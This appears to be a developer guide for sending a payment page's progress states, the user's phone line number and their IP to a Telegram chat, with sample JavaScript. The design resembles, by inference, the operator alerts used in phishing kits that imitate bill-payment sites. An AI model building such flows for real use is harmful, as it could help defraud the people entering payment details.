# Payment Tracking Setup Guide

## Overview
Real-time tracking of payment flow states in Telegram. Each page sends its status to Telegram so you can monitor where the user is in the payment process.

## How It Works

1. **User visits pago-inicio.html** → Telegram: "📍 ESTADO: Iniciando Pago"
2. **User visits pago-llave.html** → Telegram: "🔐 ESTADO: Esperando Llave Bre-B"
3. **User visits pago-tarjeta.html** → Telegram: "💳 ESTADO: Completando Pago Tarjeta"
4. **Payment completes** → Telegram: "✅ ESTADO: Pago Completado"

## Integration Steps

### Step 1: Store TxID and Referencia in localStorage

When returning from `/api/consultar-factura`, save the response:

```javascript
// In your pago-inicio.html or wherever you call consultar-factura
const response = await fetch('/api/consultar-factura', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ referencia })
});

const data = await response.json();
localStorage.setItem('txid', data.txid);
localStorage.setItem('referencia', data.factura.referencia);

// Redirect to next page
window.location.href = '/pago-llave';
```

### Step 2: Add Script to HTML Pages

Add this to the `<head>` or `<body>` of each payment page:

```html
<script src="/track-payment.js"></script>
```

### Step 3: Set the Page Identifier

Add `data-pagina` attribute to the `<body>` tag:

```html
<!-- In pago-inicio.html -->
<body data-pagina="pago-inicio">

<!-- In pago-llave.html -->
<body data-pagina="pago-llave">

<!-- In pago-tarjeta.html -->
<body data-pagina="pago-tarjeta">
```

## Available States

- `pago-inicio` → 📍 ESTADO: Iniciando Pago
- `pago-llave` → 🔐 ESTADO: Esperando Llave Bre-B
- `pago-tarjeta` → 💳 ESTADO: Completando Pago Tarjeta
- `pago-exitoso` → ✅ ESTADO: Pago Completado
- `pago-cancelado` → ❌ ESTADO: Pago Cancelado

Custom states are supported too - just use the page identifier.

## API Endpoint

**POST** `/api/track-payment-state`

```json
{
  "txid": "abc123...",
  "referencia": "3046246628",
  "pagina": "pago-llave",
  "ip": "optional - auto-detected if not provided"
}
```

## Message Format in Telegram

```
📍 ESTADO: Iniciando Pago

TxID: abc123...
Línea: 3046246628
IP: 192.168.1.1
```

## Example Implementation

### pago-inicio.html
```html
<!DOCTYPE html>
<html>
<head>
    <script src="/track-payment.js"></script>
</head>
<body data-pagina="pago-inicio">
    <!-- Payment form -->
    <form id="consultaForm">
        <!-- inputs -->
    </form>
    
    <script>
        document.getElementById('consultaForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const referencia = document.querySelector('input[name="referencia"]').value;
            
            const response = await fetch('/api/consultar-factura', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ referencia })
            });
            
            const data = await response.json();
            localStorage.setItem('txid', data.txid);
            localStorage.setItem('referencia', data.factura.referencia);
            
            // Track state when moving to next page
            await fetch('/api/track-payment-state', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    txid: data.txid,
                    referencia: data.factura.referencia,
                    pagina: 'pago-llave'
                })
            });
            
            window.location.href = '/pago-llave';
        });
    </script>
</body>
</html>
```

## Notes

- TxID and referencia are stored in browser localStorage
- Each page automatically tracks when the page loads
- IP is automatically detected by the server
- Messages are sent asynchronously and don't block user experience
